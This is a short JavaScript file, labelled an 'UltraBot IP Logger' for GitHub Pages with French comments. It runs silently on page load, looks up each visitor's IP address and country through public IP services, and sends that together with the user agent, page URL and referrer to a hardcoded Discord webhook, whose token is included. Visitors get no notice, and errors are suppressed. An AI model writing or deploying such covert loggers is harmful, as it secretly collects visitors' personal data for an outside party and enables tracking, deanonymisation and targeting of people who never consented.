// =============================================
// ULTRABOT IP LOGGER - GITHUB PAGES VERSION
// =============================================

const WEBHOOK = "https://canary.discord.com/api/webhooks/1477188997506928751/QdLJ25ZgN5GZw8ewnGTzcIHEsiH9La48uZpcf_NTPPiRZ0GSm5BzHyat3vlDpIEvO8Nz"; // ← METS TA WEBHOOK ICI

async function sendToWebhook(info) {
    const payload = {
        username: "UltraBot Logger",
        embeds: [{
            title: "🔴 Nouveau visiteur UltraBot",
            color: 0xe01a1a,
            timestamp: new Date().toISOString(),
            fields: [
                { name: "IP", value: `\`${info.ip || "Inconnu"}\``, inline: true },
                { name: "Pays", value: info.country || "Inconnu", inline: true },
                { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 280)}\`\`\``, inline: false },
                { name: "Page", value: window.location.href, inline: false },
                { name: "Referer", value: document.referrer || "Direct", inline: false },
                { name: "Heure", value: new Date().toLocaleString('fr-FR'), inline: true }
            ]
        }]
    };

    try {
        await fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
            mode: 'no-cors'        // Important pour GitHub Pages
        });
        console.log("%c[UltraBot] Visiteur loggé", "color: #e01a1a");
    } catch (e) {
        // Silencieux
    }
}

// Récupération IP avec plusieurs services
async function getIPInfo() {
    const services = [
        "https://api.ipify.org?format=json",
        "https://ipapi.co/json/",
        "https://freeipapi.com/api/json",
        "https://api.myip.com"
    ];

    for (let url of services) {
        try {
            const res = await fetch(url);
            if (res.ok) {
                const data = await res.json();
                const ip = data.ip || data.query || data.address || "Inconnu";
                const country = data.country_name || data.country || data.cc || "Inconnu";

                await sendToWebhook({ ip, country });
                return;
            }
        } catch (_) {}
    }

    // Fallback si tout échoue
    await sendToWebhook({ ip: "IP bloquée", country: "Inconnu" });
}

// Lancement
window.addEventListener('load', () => {
    setTimeout(() => {
        getIPInfo();
    }, 700);
});
